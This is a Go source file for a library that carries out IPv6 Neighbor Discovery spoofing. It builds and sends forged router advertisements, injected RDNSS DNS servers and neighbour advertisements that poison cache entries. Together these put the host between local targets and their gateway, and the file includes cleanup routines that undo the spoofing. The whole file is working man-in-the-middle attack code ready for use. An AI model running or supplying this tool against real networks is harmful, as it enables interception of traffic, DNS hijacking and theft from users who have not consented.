// Package ndpspoof is a library for performing NDP spoofing with ICMPv6 router/neighbor advertisement
package ndpspoof

import (
	"errors"
	"fmt"
	"maps"
	"net"
	"net/netip"
	"os"
	"os/exec"
	"slices"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/mdlayher/packet"
	"github.com/rs/zerolog"
	"github.com/shadowy-pycoder/mshark/layers"
	"github.com/shadowy-pycoder/mshark/network"
	"github.com/shadowy-pycoder/mshark/oui"
)

var (
	defaultRLT                = 600 // also used for RDNSS lifetime
	probeThrottling           = 50 * time.Millisecond
	probeTargetsInterval      = 60 * time.Second
	refreshNDPCacheInterval   = 15 * time.Second
	ndpSpoofTargetsInterval   = 1 * time.Second
	ndpUnspoofPacketCount     = 5
	ndpUnspoofTargetsInterval = 500 * time.Millisecond
	errNDPSpoofConfig         = fmt.Errorf(
		`failed parsing ndp spoof options. Example: "ra true;na true;rdnss true;targets fe80::3a1c:7bff:fe22:91a4,fe80::b6d2:4cff:fe9a:5f10;;dns 2001:4860:4860::8888;gateway fe80::1;fullduplex false;debug true;interface eth0;prefix 2001:db8:7a31:4400::/64;router_lifetime 30s"`,
	)
)

type NDPSpoofConfig struct {
	Targets        string
	DNSServers     string
	Gateway        *netip.Addr
	Interface      string
	FullDuplex     bool
	Prefix         *netip.Prefix
	RouterLifetime time.Duration
	Logger         *zerolog.Logger
	RA             bool
	NA             bool
	RDNSS          bool
	Debug          bool
}

// NewNDPSpoofConfig creates NDPSpoofConfig from a list of options separated by semicolon and logger.
//
// Example: "ra true;na true;rdnss true;targets fe80::3a1c:7bff:fe22:91a4,fe80::b6d2:4cff:fe9a:5f10;dns 2001:4860:4860::8888;gateway fe80::1;fullduplex false;debug true;interface eth0;prefix 2001:db8:7a31:4400::/64;router_lifetime 30s".
//
// When ra (router advertisement) and na (neighbor advertisement) are both false or not specified, ra set to true.
//
// If na is enabled, at least one target should be provided. The gateway value (or default one) will be used in neighbor advertisement.
//
// For boolean fields value can be specified as 0 or 1.
func NewNDPSpoofConfig(s string, logger *zerolog.Logger) (*NDPSpoofConfig, error) {
	nsc := &NDPSpoofConfig{Logger: logger}

	for opt := range strings.SplitSeq(strings.ToLower(s), ";") {
		keyval := strings.SplitN(strings.Trim(opt, " "), " ", 2)
		if len(keyval) < 2 {
			return nil, errNDPSpoofConfig
		}
		key := keyval[0]
		val := keyval[1]
		switch key {
		case "targets":
			nsc.Targets = val
		case "dns":
			nsc.DNSServers = val
		case "interface":
			nsc.Interface = val
		case "gateway":
			gateway, err := netip.ParseAddr(val)
			if err != nil {
				return nil, err
			}
			nsc.Gateway = &gateway
		case "fullduplex":
			switch val {
			case "true", "1":
				nsc.FullDuplex = true
			case "false", "0":
				nsc.FullDuplex = false
			default:
				return nil, fmt.Errorf("unknown value %q for %q", val, key)
			}
		case "prefix":
			prefix, err := netip.ParsePrefix(val)
			if err != nil {
				return nil, err
			}
			if !network.Is6(prefix.Addr()) {
				return nil, fmt.Errorf("prefix is not valid IPv6 address")
			}
			nsc.Prefix = &prefix
		case "router_lifetime":
			rlt, err := time.ParseDuration(val)
			if err != nil {
				return nil, err
			}
			if rlt.Seconds() > 65535 {
				return nil, fmt.Errorf("router lifetime is invalid")
			}
			nsc.RouterLifetime = rlt
		case "ra":
			switch val {
			case "true", "1":
				nsc.RA = true
			case "false", "0":
				nsc.RA = false
			default:
				return nil, fmt.Errorf("unknown value %q for %q", val, key)
			}
		case "na":
			switch val {
			case "true", "1":
				nsc.NA = true
			case "false", "0":
				nsc.NA = false
			default:
				return nil, fmt.Errorf("unknown value %q for %q", val, key)
			}
		case "rdnss":
			switch val {
			case "true", "1":
				nsc.RDNSS = true
			case "false", "0":
				nsc.RDNSS = false
			default:
				return nil, fmt.Errorf("unknown value %q for %q", val, key)
			}
		case "debug":
			switch val {
			case "true", "1":
				nsc.Debug = true
			case "false", "0":
				nsc.Debug = false
			default:
				return nil, fmt.Errorf("unknown value %q for %q", val, key)
			}
		default:
			return nil, errNDPSpoofConfig
		}
	}
	if !nsc.RA && !nsc.NA {
		nsc.RA = true
	}
	if nsc.NA && nsc.Targets == "" {
		return nil, fmt.Errorf("list of targets is empty")
	}
	if !nsc.RA && nsc.RDNSS {
		return nil, fmt.Errorf("rdnss requires ra enabled")
	}
	if nsc.RDNSS && nsc.DNSServers == "" {
		return nil, fmt.Errorf("list of dns servers is empty")
	}
	return nsc, nil
}

type NeighCache struct {
	sync.RWMutex
	Ifname  string
	Entries map[string]net.HardwareAddr
}

func (nc *NeighCache) String() string {
	var sb strings.Builder

	nc.RLock()
	defer nc.RUnlock()
	for _, k := range slices.Sorted(maps.Keys(nc.Entries)) {
		fmt.Fprintf(&sb, "%s (%s), ", k, oui.VendorWithMAC(nc.Entries[k]))
	}
	return strings.TrimRight(sb.String(), ", ")
}

func (nc *NeighCache) Get(ip netip.Addr) (net.HardwareAddr, bool) {
	nc.RLock()
	defer nc.RUnlock()
	hw, ok := nc.Entries[ip.String()]
	return hw, ok
}

func (nc *NeighCache) Set(ip netip.Addr, hw net.HardwareAddr) {
	nc.Lock()
	nc.Entries[ip.String()] = hw
	nc.Unlock()
}

func (nc *NeighCache) Delete(ip netip.Addr) {
	nc.Lock()
	delete(nc.Entries, ip.String())
	nc.Unlock()
}

func (nc *NeighCache) Refresh() error {
	nc.Lock()
	defer nc.Unlock()
	cmd := exec.Command("sh", "-c", "ip -6 -br neigh")
	out, err := cmd.Output()
	if err != nil {
		return err
	}
	clear(nc.Entries)
	for line := range strings.Lines(string(out)) {
		fields := strings.Fields(line)
		if len(fields) < 3 {
			continue
		}
		if fields[1] != nc.Ifname {
			continue
		}
		ip, err := netip.ParseAddr(fields[0])
		if err != nil {
			return err
		}
		hw, err := net.ParseMAC(fields[2])
		if err != nil {
			return err
		}
		nc.Entries[ip.String()] = hw
	}
	return nil
}

type Packet struct {
	addr net.HardwareAddr
	data []byte
}

type NDPSpoofer struct {
	raEnabled    bool
	naEnabled    bool
	rdnssEnabled bool
	targets      []netip.Addr
	dnsServers   []netip.Addr
	gwIP         *netip.Addr
	gwMAC        *net.HardwareAddr
	iface        *net.Interface
	hostIP       *netip.Addr
	hostIPGlobal *netip.Addr
	hostMAC      *net.HardwareAddr
	fullduplex   bool
	neighCache   *NeighCache
	packets      chan *Packet
	logger       *zerolog.Logger
	prefixGlobal *netip.Prefix
	rlt          uint16
	startingFlag atomic.Bool
	quit         chan bool
	wg           sync.WaitGroup
	pconn        *packet.Conn
}

func (nr *NDPSpoofer) Interface() *net.Interface {
	return nr.iface
}

func (nr *NDPSpoofer) GatewayIP() *netip.Addr {
	return nr.gwIP
}

func (nr *NDPSpoofer) GatewayMAC() *net.HardwareAddr {
	return nr.gwMAC
}

func (nr *NDPSpoofer) HostIP() *netip.Addr {
	return nr.hostIP
}

func (nr *NDPSpoofer) HostIPGlobal() *netip.Addr {
	return nr.hostIPGlobal
}

func (nr *NDPSpoofer) HostMAC() *net.HardwareAddr {
	return nr.hostMAC
}

func (nr *NDPSpoofer) NeighCache() *NeighCache {
	return nr.neighCache
}

func NewNDPSpoofer(conf *NDPSpoofConfig) (*NDPSpoofer, error) {
	ndpspoofer := &NDPSpoofer{}
	var iface *net.Interface
	var err error
	if !conf.RA && !conf.NA {
		return nil, fmt.Errorf("no attack vectors enabled")
	}
	iface, err = network.GetDefaultInterface()
	if err != nil {
		iface, err = network.GetDefaultInterfaceFromRouteIPv6()
		if err != nil {
			return nil, err
		}
	}
	if conf.Interface != "" {
		ndpspoofer.iface, err = net.InterfaceByName(conf.Interface)
		if err != nil {
			return nil, err
		}
	} else {
		ndpspoofer.iface = iface
	}
	prefixLocal, err := network.GetIPv6LinkLocalUnicastPrefixFromInterface(ndpspoofer.iface)
	if err != nil {
		return nil, err
	}
	hostIP := prefixLocal.Addr()
	ndpspoofer.hostIP = &hostIP
	ndpspoofer.hostMAC = &ndpspoofer.iface.HardwareAddr
	hostIPGlobal, err := network.GetHostIPv6GlobalUnicastFromRoute()
	if err == nil {
		ndpspoofer.hostIPGlobal = &hostIPGlobal
	}
	if conf.Gateway != nil && network.Is6(*conf.Gateway) {
		ndpspoofer.gwIP = conf.Gateway
	} else {
		var gwIP netip.Addr
		if ndpspoofer.iface.Name != iface.Name {
			gwIP, err = network.GetGatewayIPv6FromInterface(ndpspoofer.iface.Name)
			if err != nil {
				return nil, fmt.Errorf("failed fetching gateway ip: %w", err)
			}
		} else {
			gwIP, err = network.GetDefaultGatewayIPv6()
			if err != nil {
				gwIP, err = network.GetDefaultGatewayIPv6FromRoute()
				if err != nil {
					return nil, fmt.Errorf("failed fetching gateway ip: %w", err)
				}
			}
		}
		ndpspoofer.gwIP = &gwIP
	}
	if conf.RA {
		ndpspoofer.raEnabled = true
		if conf.Prefix != nil {
			ndpspoofer.prefixGlobal = conf.Prefix
		} else {
			prefixGlobal, err := network.GetIPv6GlobalUnicastPrefixFromInterface(ndpspoofer.iface)
			if err != nil {
				return nil, err
			}
			ndpspoofer.prefixGlobal = &prefixGlobal
		}
		if conf.RouterLifetime.Seconds() > 0 {
			ndpspoofer.rlt = uint16(conf.RouterLifetime.Seconds())
		} else {
			ndpspoofer.rlt = uint16(defaultRLT)
		}
		if conf.RDNSS {
			if conf.DNSServers != "" {
				dnsServers := make([]netip.Addr, 0, 5)
				for ipstr := range strings.SplitSeq(conf.DNSServers, ",") {
					ip, err := netip.ParseAddr(strings.TrimSpace(ipstr))
					if err != nil {
						return nil, err
					}
					// remove invalid addresses (sanity check)
					if !network.Is6(ip) {
						continue
					}
					// remove multicast addresses
					if ip.IsMulticast() {
						continue
					}
					dnsServers = append(dnsServers, ip)
				}
				if len(dnsServers) == 0 {
					return nil, fmt.Errorf("list of dns servers is empty")
				}
				ndpspoofer.dnsServers = dnsServers
				ndpspoofer.rdnssEnabled = true
			} else {
				return nil, fmt.Errorf("list of dns servers is empty")
			}
		}

	}
	if conf.NA {
		ndpspoofer.naEnabled = true
		ndpspoofer.neighCache = &NeighCache{Ifname: ndpspoofer.iface.Name, Entries: make(map[string]net.HardwareAddr)}
		err = ndpspoofer.neighCache.Refresh()
		if err != nil {
			return nil, err
		}
		if gwMAC, ok := ndpspoofer.neighCache.Get(*ndpspoofer.gwIP); !ok {
			doPing(ndpspoofer.gwIP.WithZone(ndpspoofer.iface.Name))
			time.Sleep(probeThrottling)
			err = ndpspoofer.neighCache.Refresh()
			if err != nil {
				return nil, err
			}
			if gwMAC, ok := ndpspoofer.neighCache.Get(*ndpspoofer.gwIP); !ok {
				return nil, fmt.Errorf("failed fetching gateway MAC")
			} else {
				ndpspoofer.gwMAC = &gwMAC
			}
		} else {
			ndpspoofer.gwMAC = &gwMAC
		}
		ndpspoofer.fullduplex = conf.FullDuplex
		targets := make([]netip.Addr, 0, 5)
		for ipstr := range strings.SplitSeq(conf.Targets, ",") {
			ip, err := netip.ParseAddr(strings.TrimSpace(ipstr))
			if err != nil {
				return nil, err
			}
			// remove invalid addresses (sanity check)
			if !network.Is6(ip) {
				continue
			}
			// remove multicast addresses
			if ip.IsMulticast() {
				continue
			}
			// remove unspecified addresses
			if ip.IsUnspecified() {
				continue
			}
			// remove loopback addresses
			if ip.IsLoopback() {
				continue
			}
			// remove addresses that do not belong to subnet
			if !prefixLocal.Contains(ip) {
				continue
			}
			// remove host from targets
			if ip.Compare(*ndpspoofer.hostIP) == 0 {
				continue
			}
			// remove gateway from targets
			if ip.Compare(*ndpspoofer.gwIP) == 0 {
				continue
			}
			targets = append(targets, ip)
		}
		if len(targets) == 0 {
			return nil, fmt.Errorf("list of targets is empty")
		}
		ndpspoofer.targets = targets
	}
	ndpspoofer.packets = make(chan *Packet)
	ndpspoofer.quit = make(chan bool)
	ndpspoofer.pconn, err = packet.Listen(ndpspoofer.iface, packet.Raw, network.ETH_P_ALL, nil)
	if err != nil {
		if errors.Is(err, os.ErrPermission) {
			return nil, fmt.Errorf("permission denied (try setting CAP_NET_RAW capability): %v", err)
		}
		return nil, fmt.Errorf("failed to listen: %v", err)
	}
	// setting up logger
	if conf.Logger != nil {
		lvl := zerolog.InfoLevel
		if conf.Debug {
			lvl = zerolog.DebugLevel
		}
		logger := conf.Logger.Level(lvl)
		ndpspoofer.logger = &logger
	} else {
		zerolog.SetGlobalLevel(zerolog.InfoLevel)
		if conf.Debug {
			zerolog.SetGlobalLevel(zerolog.DebugLevel)
		}
		logger := zerolog.New(os.Stdout).With().Timestamp().Logger()
		ndpspoofer.logger = &logger
	}
	return ndpspoofer, nil
}

func (nr *NDPSpoofer) Start() {
	nr.startingFlag.Store(true)
	nr.logger.Info().Msg("[ndp spoofer] Started")
	go nr.handlePackets()
	if nr.raEnabled {
		nr.logger.Info().Msg("[ndp spoofer] RA spoofing enabled")
	} else {
		nr.logger.Info().Msg("[ndp spoofer] RA spoofing disabled")
	}
	if nr.rdnssEnabled {
		nr.logger.Info().Msg("[ndp spoofer] RDNSS spoofing enabled")
	} else {
		nr.logger.Info().Msg("[ndp spoofer] RDNSS spoofing disabled")
	}
	if nr.naEnabled {
		nr.logger.Info().Msg("[ndp spoofer] NA spoofing enabled")
	} else {
		nr.logger.Info().Msg("[ndp spoofer] NA spoofing disabled")
	}
	if nr.naEnabled {
		nr.logger.Debug().Msgf("[ndp spoofer] Probing %d targets", len(nr.targets))
		nr.probeTargetsOnce()
		nr.logger.Debug().Msg("[ndp spoofer] Refreshing neighbor cache")
		nr.neighCache.Refresh()
		nr.logger.Info().Msgf("[ndp spoofer] Detected targets: %s", nr.neighCache)
		nr.wg.Add(3)
		go nr.probeTargets()
		go nr.refreshNeighCache()
		go nr.spoofNA()
	}
	if nr.raEnabled {
		nr.wg.Add(1)
		go nr.spoofRA()
	}
	nr.startingFlag.Store(false)
	<-nr.quit
}

func (nr *NDPSpoofer) Stop() error {
	for nr.startingFlag.Load() {
		time.Sleep(50 * time.Millisecond)
	}
	nr.logger.Info().Msg("[ndp spoofer] Stopping...")
	close(nr.quit)
	nr.wg.Wait()
	if nr.raEnabled {
		nr.wg.Add(1)
		go nr.unspoofRA()
	}
	if nr.naEnabled {
		nr.wg.Add(1)
		go nr.unspoofNA()
	}
	nr.wg.Wait()
	close(nr.packets)
	nr.logger.Info().Msg("[ndp spoofer] Stopped")
	return nil
}

func (nr *NDPSpoofer) spoofNA() {
	t := time.NewTicker(ndpSpoofTargetsInterval)
	for {
		select {
		case <-nr.quit:
			nr.wg.Done()
			return
		case <-t.C:
			for _, targetIP := range nr.targets {
				if targetMAC, ok := nr.neighCache.Get(targetIP); !ok {
					continue
				} else {
					np, err := nr.newNAPacket(*nr.hostMAC, targetMAC, *nr.gwIP, targetIP, *nr.gwIP)
					if err != nil {
						continue
					}
					nr.logger.Debug().
						Msgf("[ndp spoofer] Sending %dB of NA packet to %s (%s)", len(np.data), targetIP, oui.VendorWithMAC(targetMAC))
					nr.packets <- np
				}
				if nr.fullduplex {
					np, err := nr.newNAPacket(*nr.hostMAC, *nr.gwMAC, targetIP, *nr.gwIP, targetIP)
					if err != nil {
						continue
					}
					nr.logger.Debug().Msgf("[ndp spoofer] Telling %s (%s) we are %s", nr.gwIP, oui.VendorWithMAC(*nr.gwMAC), targetIP)
					nr.packets <- np
				}
			}
		}
	}
}

func (nr *NDPSpoofer) unspoofNA() error {
	nr.logger.Info().Msgf("[ndp spoofer] Restoring neighbor cache of %d targets", len(nr.targets))
	for range ndpUnspoofPacketCount {
		for _, targetIP := range nr.targets {
			if targetMAC, ok := nr.neighCache.Get(targetIP); !ok {
				continue
			} else {
				nr.logger.Debug().Msgf("[ndp spoofer] Restoring neighbor cache of %s (%s)", targetIP, oui.VendorWithMAC(targetMAC))
				np, err := nr.newNAPacket(*nr.gwMAC, targetMAC, *nr.gwIP, targetIP, *nr.gwIP)
				if err != nil {
					nr.wg.Done()
					return err
				}
				nr.packets <- np
			}
		}
		time.Sleep(ndpUnspoofTargetsInterval)
	}
	nr.wg.Done()
	return nil
}

func (nr *NDPSpoofer) spoofRA() {
	raPacket, err := nr.newRAPacket(nr.rlt)
	if err != nil {
		nr.wg.Done()
		return
	}
	raLen := len(raPacket.data)
	hostVMAC := oui.VendorWithMAC(*nr.hostMAC)
	t := time.NewTicker(ndpSpoofTargetsInterval)
	for {
		select {
		case <-nr.quit:
			nr.wg.Done()
			return
		case <-t.C:
			nr.logger.Debug().Msgf("[ndp spoofer] Sending %dB of RA packet from %s (%s)", raLen, nr.hostIP, hostVMAC)
			nr.packets <- raPacket
		}
	}
}

func (nr *NDPSpoofer) unspoofRA() error {
	nr.logger.Info().Msgf("[ndp spoofer] Removing spoofed gateway entry from all affected targets")
	ra, err := nr.newRAPacket(0)
	if err != nil {
		nr.wg.Done()
		return err
	}
	raLen := len(ra.data)
	var um string
	if nr.rdnssEnabled {
		um = "router_lifetime=0 dns_lifetime=0"
	} else {
		um = "router_lifetime=0"
	}
	for range ndpUnspoofPacketCount {
		nr.logger.Debug().Msgf("[ndp spoofer] Sending %dB of RA packet with [%s]", raLen, um)
		nr.packets <- ra
		time.Sleep(ndpUnspoofTargetsInterval)
	}
	nr.wg.Done()
	return nil
}

func (nr *NDPSpoofer) newRAPacket(rlt uint16) (*Packet, error) {
	ra := layers.ICMPv6RouterAdvertisement{
		CurHopLimit:    255,
		Prf:            layers.ICMPv6RouterPreferenceHigh,
		RouterLifetime: rlt,
		Options: []layers.ICMPv6Option{
			&layers.ICMPv6OptPrefixInfo{
				PrefixLength:                   64,
				OnLink:                         true,
				AutonomousAddressConfiguration: true,
				ValidLifetime:                  86400,
				PreferredLifetime:              14400,
				Prefix:                         nr.prefixGlobal.Masked().Addr(),
			},
			&layers.ICMPv6OptMTU{MTU: 1500},
			&layers.ICMPv6OptLinkLayerAddress{Direction: layers.LLASource, Addr: *nr.hostMAC},
		},
	}
	if nr.rdnssEnabled {
		ra.Options = append(ra.Options, &layers.ICMPv6OptRDNSS{Lifetime: uint32(rlt), Addresses: nr.dnsServers})
	}
	dstIP := netip.MustParseAddr("ff02::1")
	ipv6, err := layers.NewIPv6Packet(*nr.hostIP, dstIP, layers.ProtoICMPv6, ra.ToBytes())
	if err != nil {
		nr.logger.Debug().Msg(err.Error())
		return nil, err
	}
	ra.SetChecksum(ipv6.PseudoHeader().ToBytes())
	ipv6.SetPayload(ra.ToBytes())
	eth, err := layers.NewEthernetFrame(network.IPv6MulticastMAC, *nr.hostMAC, layers.EtherTypeIPv6, ipv6.ToBytes())
	if err != nil {
		nr.logger.Debug().Msg(err.Error())
		return nil, err
	}
	return &Packet{addr: network.IPv6MulticastMAC, data: eth.ToBytes()}, nil
}

func (nr *NDPSpoofer) newNAPacket(srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP, targetIP netip.Addr) (*Packet, error) {
	na := layers.ICMPv6NeighborAdvertisement{
		Solicited:     true,
		Override:      true,
		TargetAddress: targetIP,
		Options: []layers.ICMPv6Option{
			&layers.ICMPv6OptLinkLayerAddress{Direction: layers.LLATarget, Addr: srcMAC},
		},
	}
	ipv6, err := layers.NewIPv6Packet(srcIP, dstIP, layers.ProtoICMPv6, na.ToBytes())
	if err != nil {
		nr.logger.Debug().Msg(err.Error())
		return nil, err
	}
	na.SetChecksum(ipv6.PseudoHeader().ToBytes())
	ipv6.SetPayload(na.ToBytes())
	eth, err := layers.NewEthernetFrame(dstMAC, srcMAC, layers.EtherTypeIPv6, ipv6.ToBytes())
	if err != nil {
		nr.logger.Debug().Msg(err.Error())
		return nil, err
	}
	return &Packet{addr: dstMAC, data: eth.ToBytes()}, nil
}

func doPing(ip netip.Addr) error {
	ping := exec.Command("sh", "-c", fmt.Sprintf("ping -6 -c1 -t1 -w1 %s", ip))
	if err := ping.Start(); err != nil {
		return err
	}
	if err := ping.Wait(); err != nil {
		return err
	}
	return nil
}

func (nr *NDPSpoofer) probeTargetsOnce() {
	var wg sync.WaitGroup
	for _, ip := range nr.targets {
		wg.Add(1)
		go func(ip netip.Addr) {
			defer wg.Done()
			doPing(ip.WithZone(nr.iface.Name))
		}(ip)
		time.Sleep(probeThrottling)
	}
	wg.Wait()
}

func (nr *NDPSpoofer) probeTargets() {
	t := time.NewTicker(probeTargetsInterval)
	var wg sync.WaitGroup
	for {
		select {
		case <-nr.quit:
			nr.wg.Done()
			return
		case <-t.C:
			nr.logger.Debug().Msgf("[ndp spoofer] Probing %d targets", len(nr.targets))
			for _, ip := range nr.targets {
				wg.Add(1)
				go func(ip netip.Addr) {
					defer wg.Done()
					doPing(ip.WithZone(nr.iface.Name))
				}(ip)
				time.Sleep(probeThrottling)
			}
			wg.Wait()
		}
	}
}

func (nr *NDPSpoofer) writePacket(p *Packet) (int, error) {
	return nr.pconn.WriteTo(p.data, &packet.Addr{HardwareAddr: p.addr})
}

func (nr *NDPSpoofer) handlePackets() {
	for p := range nr.packets {
		_, err := nr.writePacket(p)
		if err != nil {
			nr.logger.Debug().Msg(err.Error())
		}
	}
}

func (nr *NDPSpoofer) refreshNeighCache() {
	t := time.NewTicker(refreshNDPCacheInterval)
	for {
		select {
		case <-nr.quit:
			nr.wg.Done()
			return
		case <-t.C:
			nr.logger.Debug().Msg("[ndp spoofer] Refreshing neighbor cache")
			nr.neighCache.Refresh()
			nr.logger.Info().Msgf("[ndp spoofer] Detected targets: %s", nr.neighCache)
		}
	}
}
